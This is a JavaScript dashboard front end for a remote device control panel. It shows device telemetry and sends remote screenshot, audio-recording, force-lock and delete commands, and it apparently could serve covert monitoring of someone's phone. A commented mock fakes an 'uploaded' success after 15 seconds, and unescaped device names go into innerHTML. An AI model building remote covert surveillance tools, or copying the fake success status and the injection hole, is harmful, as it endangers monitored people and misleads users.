class DashboardEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.init();
    }

    async init() {
        await this.loadDevicesList();
        if (!this.activeDeviceId) return; 
        await this.loadDeviceMetrics();
        setInterval(() => this.loadDeviceMetrics(), 10000);
    }

    async loadDevicesList() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();

            if (result.status === 'success') {
                const selectEl = document.getElementById('device-select');
                if (selectEl) {
                    selectEl.innerHTML = ''; 
                    if (result.data.length === 0) {
                        selectEl.innerHTML = '<option value="">No Devices Found</option>';
                        return;
                    }
                    result.data.forEach(dev => {
                        const option = document.createElement('option');
                        option.value = dev.id;
                        option.textContent = dev.name;
                        selectEl.appendChild(option);
                    });
                    if (!this.activeDeviceId && result.data.length > 0) {
                        this.activeDeviceId = result.data[0].id;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                    }
                    selectEl.value = this.activeDeviceId;
                    selectEl.addEventListener('change', (e) => {
                        this.activeDeviceId = e.target.value;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                        this.loadDeviceMetrics(); 
                    });
                }
            }
        } catch (e) {
            console.error("Failed to load devices list:", e);
        }
    }

    async loadDeviceMetrics() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                const dev = result.data.find(d => d.id === this.activeDeviceId);
                if (dev) this.populateMetadata(dev);
            }
        } catch (e) { console.error("Telemetry Fetch Error:", e); }
    }

    populateMetadata(dev) {
        const badge = document.getElementById('online-badge');
        if (badge) {
            badge.style.color = dev.online_status ? '#2ecc71' : '#e74c3c';
            badge.innerText = dev.online_status ? '● ONLINE' : '○ OFFLINE';
        }

        const batteryEl = document.getElementById('metric-battery');
        const batteryCard = document.getElementById('battery-card');
        const batteryState = document.getElementById('battery-state');
        if (batteryEl && batteryCard) {
            batteryEl.textContent = `${dev.battery_level || 0}%`;
            if (dev.is_charging) {
                batteryCard.className = 'flat-card bg-green';
                batteryState.textContent = 'Charging';
            } else {
                batteryCard.className = 'flat-card bg-red';
                batteryState.textContent = 'Discharging';
            }
        }

        const storageEl = document.getElementById('metric-storage');
        if (storageEl) storageEl.textContent = dev.storage_used || 'N/A';

        const nameEl = document.getElementById('info-name');
        if (nameEl) {
            nameEl.innerHTML = `
                <div style="font-size: 1.1rem; color: white;">
                    ${dev.name || 'Unknown'} <span style="font-size: 0.8rem; opacity: 0.8;">(${dev.model || ''})</span>
                </div>
                <button onclick="deleteDevice('${dev.id}')" style="margin-top: 8px; background: rgba(231, 76, 60, 0.2); color: #e74c3c; border: 1px solid #e74c3c; border-radius: 4px; padding: 4px 10px; cursor: pointer; font-size: 0.7rem; font-weight: bold; text-transform: uppercase;">
                    Remove Device
                </button>
            `;
        }
    }
}

// ==========================================
// 🚀 SECURE REMOTE ACTIONS ENGINE (UPGRADED)
// ==========================================

window.executeRemoteAction = async function(actionType, extraParams = {}) {
    const deviceId = localStorage.getItem('active_device_id');
    const token = localStorage.getItem('owner_token');
    
    if (!deviceId) return alert("No active device selected.");

    try {
        const res = await fetch(`/api/devices/${deviceId}/action`, {
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ action: actionType, ...extraParams }) 
        });
        
        const result = await res.json();
        if (result.status !== 'success') {
            alert(`❌ Action Failed: ${result.message}`);
            setLiveOpsStatus('idle'); // Reset on failure
        }
    } catch (e) {
        console.error("Action Execution Error:", e);
        alert("Network error.");
        setLiveOpsStatus('idle');
    }
};

// --- LIVE OPS UI STATE MACHINE ---
window.setLiveOpsStatus = (state, message = '', fileUrl = '#') => {
    const statusDiv = document.getElementById('live-ops-status');
    const btnScreen = document.getElementById('btn-screenshot');
    const btnAudio = document.getElementById('btn-audio');
    
    if (!statusDiv) return;

    if (state === 'idle') {
        statusDiv.style.display = 'none';
        btnScreen.disabled = false;
        btnAudio.disabled = false;
    } 
    else if (state === 'pending') {
        statusDiv.style.display = 'block';
        btnScreen.disabled = true;
        btnAudio.disabled = true;
        statusDiv.innerHTML = `<span style="color: #f1c40f; font-weight: bold;">⏳ ${message} <br/><small style="color:#ccc; font-weight:normal;">Waiting for device to upload...</small></span>`;
        
        // 🔴 REALITY CHECK (Pro Note):
        // Asli tracker tabhi kaam karega jab hum File Manager ka backend banayenge.
        // Jab File Manager ban jayega, tab JS wahan check karegi. 
        // Abhi ke liye, main ek 15-second ka mock lagaya hu taaki tu UI flow dekh sake ki kaisa lagega.
        setTimeout(() => {
            setLiveOpsStatus('ready', 'Media Uploaded to Storage!', '/files');
        }, 15000); 
    } 
    else if (state === 'ready') {
        btnScreen.disabled = false;
        btnAudio.disabled = false;
        statusDiv.innerHTML = `
            <span style="color: #2ecc71; margin-bottom: 8px; display: block; font-weight: bold;">✅ ${message}</span>
            <a href="${fileUrl}" style="background: #3498db; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; display: inline-block; font-weight: bold; font-size: 13px; text-transform: uppercase;">View / Play Media</a>
        `;
    }
};

window.requestScreenshot = () => {
    setLiveOpsStatus('pending', 'Capturing Screen...');
    window.executeRemoteAction('take_screenshot'); // Action name changed to screenshot
};

window.requestAudioSync = () => {
    const duration = document.getElementById('audio-duration').value;
    setLiveOpsStatus('pending', `Recording Audio (${duration} seconds)...`);
    window.executeRemoteAction('record_audio', { duration: parseInt(duration) });
};

window.forceLockDevice = () => {
    alert("Lock Command Sent. Note: App must have Device Admin permission to execute this.");
    window.executeRemoteAction('force_lock');
}

// Global Device Deletion
window.deleteDevice = async function(deviceId) {
    if (!confirm("WARNING: Are you sure you want to permanently remove this device?")) return;
    const token = localStorage.getItem('owner_token');
    try {
        const res = await fetch(`/api/devices/${deviceId}`, {
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const result = await res.json();
        if (result.status === 'success') {
            alert("Device removed.");
            localStorage.removeItem('active_device_id'); 
            window.location.reload(); 
        }
    } catch (e) {
        console.error("Delete Action Failed:", e);
    }
};

document.addEventListener('DOMContentLoaded', () => {
    new DashboardEngine();
});
